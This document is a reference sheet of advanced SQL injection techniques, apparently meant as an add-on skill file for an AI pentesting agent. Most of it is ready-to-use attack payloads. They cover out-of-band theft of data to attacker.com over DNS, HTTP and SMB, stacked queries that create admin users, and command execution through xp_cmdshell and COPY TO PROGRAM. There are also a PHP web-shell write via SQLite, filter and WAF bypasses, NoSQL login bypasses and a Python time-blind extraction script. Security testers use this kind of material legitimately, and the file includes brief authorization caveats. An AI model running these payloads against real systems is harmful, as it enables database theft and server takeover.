# Advanced SQL Injection Techniques

Load this file when the basic techniques in `SKILL.md` (§1–§9) are blocked, insufficient, or when the injection point is outside a plain SELECT/WHERE context. Distilled from yaklang/hack-skills (`sqli-sql-injection`), NeaByteLab/SQL-Injection-Manual (Guides 10, 12, 13), and HackTricks.

## 1. Out-of-Band (OOB) / DNS & SMB Exfiltration

Use when there is no visible output, no reliable time signal, or batched statements can't return data inline. Requires an attacker-controlled domain with authoritative DNS (DNSLog-style platforms; watch with `tcpdump port 53` / `dig`).

```sql
-- Oracle: DNS exfil via UTL_INADDR (often passes firewalls that block egress HTTP/SMB)
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual)||'.attacker.com')--
'+UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT username FROM all_users WHERE ROWNUM=1))--

-- MSSQL: DNS via xp_dirtree / xp_fileexist / fn_xe_file_target_read_file
'; EXEC master..xp_dirtree '\\attacker.com\share'--
'; EXEC master..xp_fileexist '\\attacker.com\share\a.txt'--

-- MySQL on Windows: UNC path triggers DNS + leaks NTLM hash (capture with Responder)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\a'))--
```

MSSQL OOB to an attacker-controlled database server via `OPENROWSET`:

```sql
'; INSERT INTO OPENROWSET('SQLOLEDB','Server=attacker.com,80;UID=sa;PWD=pass;Database=pwn','SELECT * FROM foo') SELECT @@version--
```

Notes: use ports 80/443 for egress; DNS labels max 63 chars → chunk long values; hex-encode extracted data so it survives hostname character rules.

## 2. Second-Order Injection

Input is stored safely (often parameterized) but later re-used as **trusted** data inside a new concatenated query.

Attack flow:
1. Register username `admin'--` (stored cleanly).
2. A later function builds `UPDATE users SET password='new' WHERE username='<stored>'` → the comment strips the condition → admin's password changes.

Hunting targets: profile update, password change, admin actions over stored records, scheduled jobs, logging tables read back into queries, saved searches/filters. Test by storing a payload then triggering every code path that reads it. sqlmap support: `--second-url` / `--second-req`.

## 3. INSERT / UPDATE / DELETE Contexts

Non-SELECT sinks behave differently — no result set to display, so exfiltration must ride into a column you can later read, or use blind/time signals.

```sql
-- INSERT VALUES clause: inject extra row, land secret into a visible column
INPUT: admin','login'),('attacker',(SELECT password FROM users LIMIT 1))--

-- INSERT blind proof (time-based, non-destructive):
INPUT: test' AND IF((SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a',SLEEP(5),0) AND '1'='1

-- UPDATE: overwrite additional columns (privilege escalation)
INPUT: a@evil.com', is_admin='1        -- -> SET email='a@evil.com', is_admin='1'

-- UPDATE: extract into a readable column (PostgreSQL concat)
INPUT: '||(SELECT password FROM users WHERE username='admin')||'

-- DELETE: confirm with a TIME payload only. A boolean OR payload widens the WHERE to all rows
-- and destroys data - never run it against real data.
INPUT: 1' AND IF((SELECT 1),SLEEP(5),0)--
```

sqlmap: `--technique=BST --risk=3 --level=3`, plus `--string`/`--not-string` to anchor responses.

## 4. ORDER BY / LIMIT / Column-Name Injection

Sorting and pagination params often skip parameterization entirely.

```sql
-- ORDER BY: conditional expression (MySQL)
?sort=CASE WHEN (SUBSTRING((SELECT database()),1,1)='a') THEN name ELSE price END
?sort=(SELECT 1 AND (SELECT SLEEP(5)))           -- if the context permits subqueries
?sort=name;SELECT SLEEP(5)--                     -- stacked variant

-- MySQL ORDER BY blind via rand(): compare row-ordering deltas
?sort=IF(SUBSTRING(database(),1,1)='a',rand(1),rand(0))

-- No-column-name extraction (unknown schema, positional access):
SELECT `3` FROM (SELECT 1,2,3 UNION SELECT * FROM target_table)a LIMIT 1,1
```

## 5. Stacked Queries

| DBMS | Support | Notes |
|---|---|---|
| MSSQL | Full | `; SELECT ...` |
| PostgreSQL | Full | `; SELECT ...` |
| MySQL | driver-dependent | works via `mysqli_multi_query` / PDO emulated prepares |
| Oracle | None | use PL/SQL blocks instead |
| SQLite | None | python `executescript` is the exception |

```sql
'; SELECT @@version; SELECT user;--                 -- MSSQL probe
'; CREATE USER attacker WITH PASSWORD 'pw';--        -- MSSQL persistence
'; EXEC sp_addsrvrolemember 'attacker','sysadmin';-- -- MSSQL escalation
'; COPY (SELECT '') TO PROGRAM 'id';--               -- PostgreSQL RCE
```

Guardrail: CREATE/DROP/ALTER only with explicit written authorization; prefer read-only PoC.

## 6. Privilege & Role Checks

```sql
-- MySQL
' UNION SELECT user,current_privileges(),NULL--      ; SHOW GRANTS
-- PostgreSQL
'; SELECT rolsuper FROM pg_roles WHERE rolname=current_user;--
-- MSSQL
' AND IS_SRVROLEMEMBER('sysadmin')=1--
-- Oracle
' AND 1=(SELECT privilege FROM session_privs WHERE privilege='SYSDBA' AND ROWNUM=1)--
```

Escalation paths once privileged: MSSQL `sp_configure 'xp_cmdshell',1; RECONFIGURE`; MySQL UDF (`CREATE FUNCTION ... SONAME`); PostgreSQL `COPY ... TO PROGRAM` / PL/Python; Oracle Java stored procedures / `DBMS_SCHEDULER` jobs.

## 7. Cross-DB Pivoting

```sql
-- MSSQL linked servers
' UNION SELECT * FROM OPENQUERY([LINKED], 'SELECT @@version')--
'; EXEC ('SELECT @@version') AT [LINKED];--

-- PostgreSQL dblink
'; SELECT * FROM dblink('host=localhost dbname=other','SELECT user,password FROM users') AS t(u text,p text);--

-- MySQL cross-database
' UNION SELECT * FROM other_db.users--
```

## 8. GraphQL + SQL Injection

Resolvers frequently concatenate arguments into SQL. Pull introspection first, then attack args named `id`, `filter`, `where`, `search`, `orderBy`, `sort`, `limit`, `offset`.

```graphql
{ users(where: {name: "admin' OR '1'='1"}) { id email } }
{ users(orderBy: "created_at;SELECT SLEEP(5)--") { title } }
mutation { createUser(input: {name: "test',(SELECT password FROM users LIMIT 1))-- -"}) { id } }
```

Batched queries let one request hit many resolvers. sqlmap: `--data='{"query":"{ user(id: \"1*\") { name } }"}' --content-type="application/json"`.

## 9. JSON / XML / Header / Cookie Contexts

```json
{"name": "' UNION SELECT username,password FROM admin--"}
{"product_id": "1' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM admin)>0 THEN 1 ELSE 0 END)=1--"}
{"timestamp": "2024-01-01' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"}
```

JSON key-name injection: `{"admin' OR 1=1--": "v"}` when keys become identifiers. XML: `<id>1' OR '1'='1</id>`; XXE+SQLi chains where entities feed queries. Headers commonly logged into SQL: `User-Agent`, `Referer`, `X-Forwarded-For`, `Cookie`.

**JSON-operator WAF bypass** — databases parse JSON syntax that WAF signatures miss:

```sql
' AND '{"b":2}'::jsonb @> '{"b":2}'::jsonb--                  -- PostgreSQL, true
' AND JSON_EXTRACT('{"id": 1}', '$.id') = 1--                 -- MySQL, true
' AND '{"a":1}' -> '$.a' = 1--                                -- SQLite, true
```

## 10. ORM-Specific Pitfalls

Parameterized ORM code still breaks when structure is dynamic:
- Identifiers (table/column names) cannot be bound → whitelist them. `"SELECT * FROM " + req.query.table` is injectable even when everything else is prepared.
- Partial parameterization: one field concatenated, rest bound.
- Dynamic `IN (...)` lists built by joining values.
- Sequelize `order`, Hibernate HQL string building, Django `RawSQL`/`extra`, Laravel `DB::raw`/`selectRaw`.
- PDO with `ATTR_EMULATE_PREPARES=true` can permit stacked queries.

## 11. Additional DBMS Coverage

**SQLite -> RCE** (no information_schema, no SLEEP):

```sql
' UNION SELECT name,type,sql FROM sqlite_master--
ATTACH DATABASE '/var/www/html/shell.php' AS p; CREATE TABLE p.x(c TEXT); INSERT INTO p.x VALUES ('<?php system($_GET["c"]); ?>');
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--    -- time delay
-- Also: load_extension('/tmp/evil.so'), writefile() if compiled in, PRAGMA table_info(users)
```

**Oracle** (needs `FROM dual`, `||` concat, `ROWNUM` paging):

```sql
' UNION SELECT banner,NULL,NULL FROM v$version WHERE ROWNUM=1--
' UNION SELECT owner||'.'||table_name,NULL,NULL FROM all_tables WHERE ROWNUM=1--
' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))--      -- error-based (CVE-2020-9402 pattern)
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(10),5)--                   -- time-based
```

**MSSQL extras**: `CONVERT(int,(SELECT @@version))` error-based; `WAITFOR DELAY`; `--sp_password` log hiding; `OPENROWSET(BULK 'C:\file.txt', SINGLE_CLOB)` file read; `xp_cmdshell`; `sp_OACreate 'wscript.shell'`.

**PostgreSQL extras**: `CAST(version() AS int)` error-based; dollar-quoting `$$admin$$` to dodge quote filters; `pg_read_file`; `lo_import/lo_get`; `COPY ... FROM/TO PROGRAM`; `pg_tables`/`pg_database`.

**DB2**: `sysibm.sysdummy1` (=dual), `syscat.schemata`, `FETCH FIRST 1 ROWS ONLY` (no LIMIT), Cartesian-product timing, `QSYS2.QCMDEXC()` on IBM i.

**Cassandra/CQL**: no JOIN/UNION/subqueries/OR-in-WHERE/SLEEP. Bypasses: `admin' ALLOW FILTERING; %00` and multi-line comment split across fields (`admin'/*` + `*/and pass>'`).

**NoSQL/MongoDB**: see §16 (full operator-injection coverage).

## 12. CTF / Extreme Filter Tricks

```sql
-- Versioned comments (MySQL executes inside /*!NNNNN...*/)
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--

-- PREPARE + hex to hide keywords entirely
SET @a=0x73656c65637420757365722829; PREPARE s FROM @a; EXECUTE s;

-- HANDLER when SELECT is filtered
HANDLER `users` OPEN AS a; HANDLER a READ NEXT;

-- Double-write when keywords stripped once: uunionnion sselectelect

-- XOR blind when comparison ops filtered:
id=1^(ascii(substr((select(flag)from(flag)),1,1))>100)^1

-- PIPES_AS_CONCAT mode: SELECT 1||flag FROM flag

-- innodb_table_stats when information_schema is filtered:
SELECT table_name FROM mysql.innodb_table_stats WHERE database_name=database()

-- group_concat replacement via duplication error:
SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x
```

## 13. DoS Patterns — Awareness Only

`BENCHMARK(1000000000,SHA1('test'))`, Cartesian products (`pg_class,pg_class t2,t3,t4`), `WHILE 1=1`, table locks. These impact availability — out of scope for normal testing; note them as theoretical impact only.

## 14. No-Quote String Construction

```sql
CHAR(117,115,101,114,110,97,109,101)              -- MySQL 'username'
CHAR(117)+CHAR(115)+CHAR(110)                     -- MSSQL
CHR(117)||CHR(115)||CHR(110)                      -- Oracle/PostgreSQL
0x757365726e616d65                                 -- MySQL hex literal
```

Also: `%00` null-byte truncation after payloads, unicode look-alike quotes (U+02B9/U+02BA), `%%2727` double-decode artifacts, wide-byte GBK `%bf%27`.

## 15. Time-Based Blind Automation (Python)

Manual char-by-char time-blind is hundreds of requests — script it. Minimal MySQL extractor (adapt the payload template for other DBMS; add jitter-aware sampling and a max-position guard before running against any target you're authorized to test):

```python
#!/usr/bin/env python3
import requests, string, time

def time_based_sqli(url, param, delay=5, table="users", column="password", where="username='admin'"):
    charset = string.ascii_letters + string.digits + "!@#$%^&*()_+-="
    out, pos = "", 1
    while True:
        hit = False
        for ch in charset:
            payload = (f"1' AND IF((SELECT SUBSTRING({column},{pos},1) FROM {table} "
                       f"WHERE {where})='{ch}',SLEEP({delay}),0)--")
            t0 = time.time()
            try:
                requests.get(url, params={param: payload}, timeout=delay + 2)
            except requests.Timeout:
                out += ch; hit = True; break
            if time.time() - t0 >= delay:
                out += ch; hit = True; break
        if not hit:
            break
        pos += 1
        print(f"[{pos-1}] {out}")
    return out
```

Notes: prefer boolean-blind or UNION when any delta/reflection exists (far fewer requests); binary-search ASCII instead of linear charset scan to cut requests ~4x; re-sample ambiguous positions; respect scope rate limits — this loop can mean thousands of requests.

## 16. NoSQL / MongoDB Operator Injection

Adjacent class, same mindset as SQLi auth bypass: the query *structure* is JSON, so injecting objects changes operators. Full CVE case studies in `hunting-playbook.md` §5.

```javascript
// Login bypass via JSON body
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"$where": "this.username == this.password"}

// Query-string PHP-style array syntax
username[$ne]=invalid&password[$ne]=invalid
username[$regex]=^a.*          // brute-force prefix char-by-char (Rocket.Chat pattern)

// Mongo $where DoS/exfil primitive (Mongoose populate({match}) path)
populate({path:'author', match:{$where:"sleep(5000) || true"}})
```

Detection signals: parameter accepts an object/array where a string is expected (server errors about types), response deltas between `{"x":""}` and `{"x":{"$ne":null}}`, timing deltas from `$where` JS. PHP hash-juggling variants: `param[key]=value` arrays reaching loose comparisons. WAF bypass: unicode-escaped keys (`{"$\u0067t": ""}`). Dedicated tooling: NoSQLMap (`sqlmap-advanced.md` §10). Guardrail: prove with read-only operator deltas; never run `$where` work that degrades shared databases.
